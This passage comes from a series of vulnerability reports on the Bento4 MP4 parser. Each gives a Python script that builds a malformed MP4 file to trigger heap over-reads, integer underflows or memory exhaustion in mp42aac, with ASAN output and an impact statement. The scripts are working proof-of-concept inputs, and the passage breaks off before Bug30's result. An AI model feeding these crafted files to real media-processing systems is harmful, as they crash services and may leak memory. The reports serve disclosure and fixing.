In `AP4_Dac4Atom::Create()` in `Ap4Dac4Atom.cpp` at line 49, the expression `payload_size = size - AP4_ATOM_HEADER_SIZE` performs an unchecked unsigned subtraction where `size` is taken directly from the file-supplied `dac4` box size field, causing an integer underflow when `size` is less than 8 that produces an ~4 GB value used to allocate and then over-read a small heap buffer.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload

def fullbox(box_type, version, flags, payload):
    vf = struct.pack(">B", version) + struct.pack(">I", flags & 0x00FFFFFF)[1:]
    return box(box_type, vf + payload)

IDENTITY_MATRIX = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)

# Malformed dac4 box: size field = 4 (< AP4_ATOM_HEADER_SIZE=8)
# Parser reads size=4 and type="dac4", then calls Create(4, stream).
# Inside Create(): payload_size = 4 - 8 = 0xFFFFFFF8 (underflow).
dac4_box = struct.pack(">I4s", 4, b"dac4")

audio_entry_fields = (
    b"\x00" * 6 +
    struct.pack(">H", 1) +
    b"\x00" * 8 +
    struct.pack(">H", 2) +
    struct.pack(">H", 16) +
    struct.pack(">H", 0) +
    struct.pack(">H", 0) +
    struct.pack(">I", 44100 << 16)
)
mp4a_box = box(b"mp4a", audio_entry_fields + dac4_box)

stsd_box = fullbox(b"stsd", 0, 0, struct.pack(">I", 1) + mp4a_box)
stts_box = fullbox(b"stts", 0, 0, struct.pack(">I", 0))
stsc_box = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))
stsz_box = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stco_box = fullbox(b"stco", 0, 0, struct.pack(">I", 0))
stbl_box = box(b"stbl", stsd_box + stts_box + stsc_box + stsz_box + stco_box)

smhd_box = fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))
url_box  = fullbox(b"url ", 0, 1, b"")
dref_box = fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url_box)
dinf_box = box(b"dinf", dref_box)
minf_box = box(b"minf", smhd_box + dinf_box + stbl_box)

mdhd_box = fullbox(b"mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0, 0))
hdlr_box = fullbox(b"hdlr", 0, 0,
    struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"\x00")
mdia_box = box(b"mdia", mdhd_box + hdlr_box + minf_box)

tkhd_box = fullbox(b"tkhd", 0, 3,
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">HH", 0, 0) +
    struct.pack(">H", 0x0100) +
    struct.pack(">H", 0) +
    IDENTITY_MATRIX +
    struct.pack(">II", 0, 0))
trak_box = box(b"trak", tkhd_box + mdia_box)

mvhd_box = fullbox(b"mvhd", 0, 0,
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    IDENTITY_MATRIX +
    b"\x00" * 24 +
    struct.pack(">I", 2))
moov_box = box(b"moov", mvhd_box + trak_box)
ftyp_box = box(b"ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

mp4_data = ftyp_box + moov_box
with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)
print(f"[+] Written {OUTPUT_FILE} ({len(mp4_data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000013c at pc 0x56366f8ef2d0 bp 0x7ffedb392ef0 sp 0x7ffedb392ee0
READ of size 1 at 0x50200000013c thread T0
    #0 0x56366f8ef2cf in AP4_BitReader::ReadBits(unsigned int) (mp42aac+0x93d2cf)
    #1 0x56366fa5f05a in AP4_Dac4Atom::AP4_Dac4Atom(unsigned int, unsigned char const*) (mp42aac+0xaad05a)

### Impact

An attacker who supplies a crafted MP4 file with a `dac4` box whose size field is less than 8 can trigger an integer underflow in `AP4_Dac4Atom::Create`, causing the parser to construct an `AP4_BitReader` over a heap buffer using the wrapped-around size (~4 GB), which then reads beyond the 12-byte allocated region and produces a heap-buffer-overflow. This vulnerability is exploitable through any invocation of `mp42aac` on an untrusted MP4 file, enabling denial of service via process crash and potentially enabling information disclosure or arbitrary code execution depending on heap layout at the time of the out-of-bounds read. No special privileges are required and the attack surface is fully exposed to any user or service that processes attacker-supplied MP4 files with Bento4.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Dac4Atom_cpp#002 -->
<!-- DEDUP: AP4_Dac4Atom::Create::CWE-191 -->

## Bug25: Heap Out-of-Bounds Read in AP4_Dec3Atom Constructor via Insufficient Payload Size Check

In `AP4_Dec3Atom::AP4_Dec3Atom()` in `Ap4Dec3Atom.cpp`, the substream parsing loop guards against reading substream fields only when `payload_size < 3`, but unconditionally accesses `payload[3]` (requiring 4 bytes) when `num_dep_sub` is nonzero, causing a one-byte heap buffer over-read followed by an unsigned integer underflow of `payload_size` to `0xFFFFFFFF` that allows further out-of-bounds reads across subsequent substream iterations.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data):
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data

def make_fullbox(box_type, version, flags, data):
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return make_box(box_type, vf + data)

# dec3 box (EC3SpecificBox) -- exactly 13 bytes total
# payload[4]=0x0E -> num_dep_sub=(0x0E>>1)&0xF=7 (nonzero) -> triggers OOB read of payload[3]
dec3_payload = bytes([0x00, 0x00, 0x00, 0x00, 0x0E])
dec3_box = struct.pack(">I", 13) + b'dec3' + dec3_payload

# ec-3 AudioSampleEntry
ec3_audio_entry = (
    b'\x00' * 6 +
    struct.pack(">H", 1) +
    b'\x00' * 8 +
    struct.pack(">H", 2) +
    struct.pack(">H", 16) +
    struct.pack(">H", 0) +
    struct.pack(">H", 0) +
    struct.pack(">I", 44100 << 16) +
    dec3_box
)
ec3_box = make_box(b'ec-3', ec3_audio_entry)

stsd_box = make_fullbox(b'stsd', 0, 0, struct.pack(">I", 1) + ec3_box)
stts_box = make_fullbox(b'stts', 0, 0, struct.pack(">I", 0))
stsc_box = make_fullbox(b'stsc', 0, 0, struct.pack(">I", 0))
stsz_box = make_fullbox(b'stsz', 0, 0, struct.pack(">II", 0, 0))
stco_box = make_fullbox(b'stco', 0, 0, struct.pack(">I", 0))
stbl_box = make_box(b'stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)

smhd_box = make_fullbox(b'smhd', 0, 0, struct.pack(">HH", 0, 0))
url_box = make_fullbox(b'url ', 0, 1, b'')
dref_box = make_fullbox(b'dref', 0, 0, struct.pack(">I", 1) + url_box)
dinf_box = make_box(b'dinf', dref_box)
minf_box = make_box(b'minf', smhd_box + dinf_box + stbl_box)

mdhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 44100) + struct.pack(">I", 0) +
    struct.pack(">HH", 0x55C4, 0)
)
mdhd_box = make_fullbox(b'mdhd', 0, 0, mdhd_data)

hdlr_data = struct.pack(">I", 0) + b'soun' + b'\x00' * 12 + b'\x00'
hdlr_box = make_fullbox(b'hdlr', 0, 0, hdlr_data)
mdia_box = make_box(b'mdia', mdhd_box + hdlr_box + minf_box)

unity_matrix = struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 1) + struct.pack(">I", 0) +
    struct.pack(">I", 0) + b'\x00' * 8 +
    struct.pack(">HH", 0, 0) + struct.pack(">H", 0x0100) +
    struct.pack(">H", 0) + unity_matrix + struct.pack(">II", 0, 0)
)
tkhd_box = make_fullbox(b'tkhd', 0, 3, tkhd_data)
trak_box = make_box(b'trak', tkhd_box + mdia_box)

mvhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 1000) + struct.pack(">I", 0) +
    struct.pack(">I", 0x00010000) + struct.pack(">H", 0x0100) +
    b'\x00' * 10 + unity_matrix + b'\x00' * 24 +
    struct.pack(">I", 2)
)
mvhd_box = make_fullbox(b'mvhd', 0, 0, mvhd_data)
moov_box = make_box(b'moov', mvhd_box + trak_box)

ftyp_box = make_box(b'ftyp', b'mp42' + struct.pack(">I", 0) + b'mp42' + b'isom')
mdat_box = struct.pack(">I", 8) + b'mdat'

mp4_data = ftyp_box + moov_box + mdat_box
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f"[+] Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f5 at pc 0x55f0f8bb4e2d bp 0x7ffde9937e00 sp 0x7ffde9937df0
READ of size 1 at 0x5020000000f5 thread T0
    #0 0x55f0f8bb4e2c in AP4_Dec3Atom::AP4_Dec3Atom(unsigned int, unsigned char const*)
    #1 0x55f0f8bb6c8a in AP4_Dec3Atom::Create(unsigned int, AP4_ByteStream&)

### Impact

Processing a crafted MP4 file containing a `dec3` box with a truncated payload causes a one-byte heap out-of-bounds read in `AP4_Dec3Atom::AP4_Dec3Atom()`, which can expose heap metadata or adjacent object contents from the process heap. The subsequent unsigned integer underflow of `payload_size` to `0xFFFFFFFF` allows up to seven additional substream iterations to read further beyond the allocation boundary, increasing the potential for information disclosure that could be used to defeat ASLR. Any invocation of `mp42aac` on an untrusted MP4 file is exposed to this attack with no authentication or interaction required beyond supplying the file.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Dec3Atom_cpp#001 -->
<!-- DEDUP: AP4_Dec3Atom::AP4_Dec3Atom::CWE-125 -->

## Bug26: Heap Out-of-Bounds Read in AP4_BitReader::ReadCache During dac4 DSI Parsing

In `AP4_Dac4Atom::AP4_Dac4Atom()` in `Ap4Dac4Atom.cpp`, `AP4_BitReader::ReadCache()` reads a 4-byte word past the end of the allocated payload buffer with no bounds check present, causing a heap out-of-bounds read when parsing a crafted `dac4` box whose 11-byte payload is exhausted before all required bit fields are consumed.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(fourcc, data):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('latin-1')
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc + data

def make_full_box(fourcc, version, flags, data):
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return make_box(fourcc, vf + data)

# dac4 payload: exactly 11 bytes (minimum to pass payload_size < 11 check)
#
# Bit layout (MSB first):
#   bits  0- 2 : ac4_dsi_version = 1        (3 bits: 001)
#   bits  3- 9 : bitstream_version = 1      (7 bits: 0000001)
#   bit  10    : fs_index = 0               (1 bit:  0)
#   bits 11-14 : frame_rate_index = 0       (4 bits: 0000)
#   bits 15-23 : n_presentations = 511      (9 bits: 111111111)
#   bits 24-87 : zeros (8 bytes padding)
#
# Byte 0: 0x20  Byte 1: 0x41  Byte 2: 0xFF  Bytes 3-10: 0x00
#
# After bit 24, the parser reads bit_rate_mode(2)+bit_rate(32)+bit_rate_precision(32).
# bit_rate_precision spans bits 58-89, crossing the 88-bit buffer boundary -> OOB.
dac4_payload = bytes([0x20, 0x41, 0xFF]) + bytes(8)
assert len(dac4_payload) == 11

dac4 = make_box('dac4', dac4_payload)

audio_entry_data = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 8 +
    struct.pack('>H', 2) +
    struct.pack('>H', 16) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>I', 44100 << 16) +
    dac4
)
audio_entry = make_box('ac-4', audio_entry_data)

stsd = make_full_box('stsd', 0, 0, struct.pack('>I', 1) + audio_entry)
stts = make_full_box('stts', 0, 0, struct.pack('>I', 0))
stsc = make_full_box('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_full_box('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_full_box('stco', 0, 0, struct.pack('>I', 0))
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

url_entry = make_full_box('url ', 0, 1, b'')
dref = make_full_box('dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = make_box('dinf', dref)
smhd = make_full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = make_box('minf', smhd + dinf + stbl)

mdhd_data = (
    struct.pack('>IIII', 0, 0, 44100, 0) +
    struct.pack('>HH', 0x55C4, 0)
)
mdhd = make_full_box('mdhd', 0, 0, mdhd_data)
hdlr_data = (
    struct.pack('>I', 0) +
    b'soun' +
    b'\x00' * 12 +
    b'SoundHandler\x00'
)
hdlr = make_full_box('hdlr', 0, 0, hdlr_data)
mdia = make_box('mdia', mdhd + hdlr + minf)

identity_matrix = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000
)
tkhd_data = (
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHH', 0, 0, 0x0100) +
    b'\x00' * 2 +
    identity_matrix +
    struct.pack('>II', 0, 0)
)
tkhd = make_full_box('tkhd', 0, 3, tkhd_data)
trak = make_box('trak', tkhd + mdia)

mvhd_data = (
    struct.pack('>IIIII', 0, 0, 44100, 0, 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = make_full_box('mvhd', 0, 0, mvhd_data)
moov = make_box('moov', mvhd + trak)

ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box('ftyp', ftyp_data)

mp4 = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] dac4 payload (hex): {dac4_payload.hex()}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000013c at pc 0x56366f8ef2d0 bp 0x7ffedb392ef0 sp 0x7ffedb392ee0
READ of size 1 at 0x50200000013c thread T0
    #0 in AP4_BitReader::ReadBits(unsigned int)
    #1 in AP4_Dac4Atom::AP4_Dac4Atom(unsigned int, unsigned char const*)
0x50200000013c is located 0 bytes to the right of 12-byte region [0x502000000130,0x50200000013c)

### Impact

An attacker who supplies a crafted MP4 file with a minimal 11-byte `dac4` box payload can cause `AP4_BitReader::ReadCache()` to read bytes beyond the end of the heap-allocated buffer, exposing adjacent heap contents including metadata, pointer values, and data from other parsed boxes that can aid in bypassing ASLR and enable further exploitation. The vulnerable code path is reached by any invocation of mp42aac on an untrusted MP4 file, requiring no authentication or elevated privileges, making this an exploitable attack surface for any user-facing or automated pipeline that processes AC-4 audio content. Depending on heap layout, if the out-of-bounds read reaches an unmapped memory page the process will crash, constituting a reliable denial-of-service condition.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Dac4Atom_cpp#001 -->
<!-- DEDUP: AP4_Dac4Atom::AP4_Dac4Atom::CWE-125 -->

## Bug27: Unbounded elst entry_count Causes Massive Heap Allocation and DoS in AP4_ElstAtom Constructor

In `AP4_ElstAtom::AP4_ElstAtom()` (Ap4ElstAtom.cpp:72-73), the `entry_count` field is read directly from the stream with no upper-bound validation and passed to `m_Entries.EnsureCapacity(entry_count)` whose return value is ignored, causing `AP4_Array::EnsureCapacity` to request an allocation of `entry_count * 24` bytes that exhausts process memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTFILE = "poc_input.mp4"

def make_box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("ascii") + payload

def make_fullbox(type_str, version, flags, payload=b""):
    flags_bytes = struct.pack(">I", flags & 0xFFFFFF)[1:]
    fb_payload = struct.pack(">B", version) + flags_bytes + payload
    return make_box(type_str, fb_payload)

# ftyp box: 16 bytes
ftyp_payload = b"isom" + struct.pack(">I", 0)
ftyp = make_box("ftyp", ftyp_payload)

# elst box: version=0, flags=0, entry_count=0x20000000, no actual entry data
TRIGGER_ENTRY_COUNT = 0x20000000
elst_payload = struct.pack(">I", TRIGGER_ENTRY_COUNT)
elst = make_fullbox("elst", 0, 0, elst_payload)

# Nest: edts -> trak -> moov
edts = make_box("edts", elst)
trak = make_box("trak", edts)
moov = make_box("moov", trak)

mp4_data = ftyp + moov

with open(OUTFILE, "wb") as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUTFILE}")
print(f"elst entry_count = 0x{TRIGGER_ENTRY_COUNT:08X} ({TRIGGER_ENTRY_COUNT})")
print(f"EnsureCapacity will call ::operator new({TRIGGER_ENTRY_COUNT} * 24) = ~{TRIGGER_ENTRY_COUNT * 24 / (1024**3):.1f} GB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (1024Mb vs 1202Mb)

### Impact

An attacker who supplies a crafted MP4 file with an oversized `elst` box `entry_count` can cause mp42aac to request approximately 12 GB of heap memory during parsing, exhausting available memory and crashing the process. This constitutes a reliable denial-of-service condition triggered by any invocation of mp42aac on an untrusted MP4 file. On systems without memory overcommit, the uncaught `std::bad_alloc` exception propagates without any error handling and terminates the process immediately.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4ElstAtom_cpp#001 -->
<!-- DEDUP: AP4_Array<AP4_ElstEntry>::EnsureCapacity::CWE-190 -->

## Bug28: Unbounded entry_count in AP4_ElstAtom Constructor Causes Heap Exhaustion and DoS

`AP4_ElstAtom::AP4_ElstAtom()` in `Ap4ElstAtom.cpp` reads `entry_count` from the MP4 stream as a 32-bit unsigned integer with no upper-bound validation before passing it to `AP4_Array<AP4_ElstEntry>::EnsureCapacity()`, which attempts to allocate `entry_count * 20` bytes and causes a fatal allocation failure or heap buffer overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data):
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_full_box(box_type, version, flags, data):
    size = 12 + len(data)
    return struct.pack('>I', size) + box_type + struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data

# ftyp box
ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box(b'ftyp', ftyp_data)

# mvhd (version 0): full box + 100 bytes of zeros
mvhd = make_full_box(b'mvhd', 0, 0, b'\x00' * 100)

# tkhd (version 0): full box + 92 bytes of zeros
tkhd = make_full_box(b'tkhd', 0, 0, b'\x00' * 92)

# elst full box: entry_count=0xFFFFFF00 with no actual entry data following
# 0xFFFFFF00 * 20 bytes per entry ~= 3.4 GB, triggering std::bad_alloc on 64-bit
elst_data = struct.pack('>I', 0xFFFFFF00)
elst = make_full_box(b'elst', 0, 0, elst_data)

# edts container box containing elst
edts = make_box(b'edts', elst)

# trak container box containing tkhd + edts
trak = make_box(b'trak', tkhd + edts)

# moov container box containing mvhd + trak
moov = make_box(b'moov', mvhd + trak)

# Final MP4 file
mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to poc_input.mp4")
print(f"elst entry_count = 0xFFFFFF00 ({0xFFFFFF00})")
print(f"Expected allocation: 0xFFFFFF00 * 20 = {0xFFFFFF00 * 20} bytes (~{0xFFFFFF00 * 20 / (1024**3):.1f} GB)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12). The process aborted unconditionally after ASAN attempted to satisfy the ~15 TB allocation (including shadow memory overhead) for an elst box declaring entry_count=0xFFFFFF00.

### Impact

An attacker can crash any mp42aac process unconditionally by supplying a crafted MP4 file whose elst box declares a large entry_count with no corresponding entry data, constituting a reliable denial of service against all 64-bit deployments. On 32-bit builds the multiplication `entry_count * sizeof(AP4_ElstEntry)` wraps to a small value, causing `EnsureCapacity` to allocate a tiny buffer while leaving `m_AllocatedCount` set to the attacker-controlled count, and subsequent `Append()` calls then write attacker-influenced `AP4_ElstEntry` fields beyond the heap allocation, enabling heap buffer overflow that could potentially lead to arbitrary code execution. The attack surface is any invocation of mp42aac on an untrusted MP4 file, requiring no authentication or special privileges.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4ElstAtom_h#001 -->
<!-- DEDUP: AP4_ElstAtom::AP4_ElstAtom::CWE-190 -->

## Bug29: stz2 integer overflow in AP4_Stz2Atom constructor leads to heap buffer over-read

In `AP4_Stz2Atom::AP4_Stz2Atom` (`Ap4Stz2Atom.cpp`, lines 88–120), the expression `(sample_count * m_FieldSize + 7) / 8` computes `table_size` using 32-bit unsigned arithmetic without overflow checking, so when an attacker sets `sample_count=0x10000000` and `field_size=16` the product wraps to zero and a zero-byte buffer is allocated, then read out-of-bounds for every loop iteration.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(type_str, payload):
    size = 8 + len(payload)
    return struct.pack('>I', size) + type_str.encode('latin-1') + payload

def make_fullbox(type_str, version, flags, payload):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(type_str, hdr + payload)

# stz2 atom: field_size=16, sample_count=0x10000000
# table_size = (0x10000000 * 16 + 7) / 8 = (0x100000000 + 7) / 8
#            → uint32_t wraps to 0, so table_size = 0
# buffer = new unsigned char[0]  (1-byte ASAN allocation)
# loop reads buffer[i*2] for 0x10000000 iterations → heap OOB READ
stz2_payload = (
    b'\x00\x00\x00'                    # reserved (3 bytes)
    + struct.pack('B', 16)             # field_size = 16
    + struct.pack('>I', 0x10000000)    # sample_count = 0x10000000
)
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

stbl = make_box('stbl', stz2)
minf = make_box('minf', stbl)
mdia = make_box('mdia', minf)
trak = make_box('trak', mdia)
moov = make_box('moov', trak)

ftyp = make_box('ftyp',
    b'mp42'
    + struct.pack('>I', 0)
    + b'mp42'
)

mp4_data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f'[+] Written {len(mp4_data)} bytes to poc_input.mp4')
print('[+] sample_count=0x10000000, field_size=16 -> uint32_t overflow -> table_size=0')
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000091 at pc 0x55da9b537b62 bp 0x7ffcbd069a50 sp 0x7ffcbd069a40
READ of size 1 at 0x502000000091 thread T0
    #0 0x55da9b537b61 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51b61)
    #1 0x55da9b5389fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file with a malformed `stz2` box can trigger a heap buffer over-read in `AP4_Stz2Atom::AP4_Stz2Atom`, exposing adjacent heap contents including metadata from other allocations and potentially leaking sensitive runtime information. The out-of-bounds reads escalate in offset with each loop iteration up to 268 million times, causing an inevitable crash that constitutes a reliable denial of service against any mp42aac invocation on an untrusted MP4 file. In environments where heap layout is predictable, the corrupted `m_Entries` sample-size table propagated to subsequent `GetSampleSize()` calls may provide a primitive for further exploitation.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4File_h#001 -->
<!-- DEDUP: `AP4_Stz2Atom::AP4_Stz2Atom::CWE-190 -->

## Bug30: Integer overflow in AP4_Array::EnsureCapacity leading to heap buffer overflow in AP4_FragmentSampleTable::AddTrun

In `AP4_FragmentSampleTable::AddTrun` (Ap4FragmentSampleTable.cpp) and `AP4_Array<T>::EnsureCapacity` (Ap4Array.h), an attacker-controlled `sample_count` field of `0x20000000` from a crafted trun atom is passed directly to `EnsureCapacity` without any upper-bound validation, causing integer overflow in the allocation size on 32-bit builds (heap buffer overflow) and uncontrolled multi-gigabyte memory exhaustion on 64-bit builds (denial of service via RSS limit or std::bad_alloc abort).

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode("ascii") + payload

def fullbox(box_type, version, flags, payload):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)

def build_ftyp():
    payload = b"mp42"
    payload += struct.pack(">I", 0)
    payload += b"mp42"
    return box("ftyp", payload)

def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return fullbox("mvhd", 0, 0, payload)

def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
    payload += b"\x00" * 8
    payload += struct.pack(">hhhh", 0, 0, 0, 0)
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)
    return fullbox("tkhd", 0, 0x000003, payload)

def build_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">HH", 0x55C4, 0)
    return fullbox("mdhd", 0, 0, payload)

def build_hdlr():
    payload = struct.pack(">I", 0)
    payload += b"soun"
    payload += b"\x00" * 12
    payload += b"\x00"
    return fullbox("hdlr", 0, 0, payload)

def build_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox("smhd", 0, 0, payload)

def build_dinf():
    url_payload = struct.pack(">B", 0) + b"\x00\x00\x01"
    url_entry = box("url ", url_payload)
    dref_payload = struct.pack(">I", 1) + url_entry
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)

def build_stbl():
    stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))
    stts = fullbox("stts", 0, 0, struct.pack(">I", 0))
    stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))
    stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))
    stco = fullbox("stco", 0, 0, struct.pack(">I", 0))
    return box("stbl", stsd + stts + stsc + stsz + stco)

def build_minf():
    return box("minf", build_smhd() + build_dinf() + build_stbl())

def build_mdia():
    return box("mdia", build_mdhd() + build_hdlr() + build_minf())

def build_trak():
    return box("trak", build_tkhd() + build_mdia())

def build_moov():
    return box("moov", build_mvhd() + build_trak())

def build_mfhd():
    return fullbox("mfhd", 0, 0, struct.pack(">I", 1))

def build_tfhd():
    return fullbox("tfhd", 0, 0x000000, struct.pack(">I", 1))

def build_trun():
    SAMPLE_COUNT = 0x20000000
    payload = struct.pack(">I", SAMPLE_COUNT)
    payload += struct.pack(">i", 8)
    return fullbox("trun", 0, 0x000001, payload)

def build_traf():
    return box("traf", build_tfhd() + build_trun())

def build_moof():
    return box("moof", build_mfhd() + build_traf())

def build_mdat():
    return box("mdat", b"")

ftyp = build_ftyp()
moov = build_moov()
moof = build_moof()
mdat = build_mdat()
mp4_data = ftyp + moov + moof + mdat

with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)
print(f"[+] Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
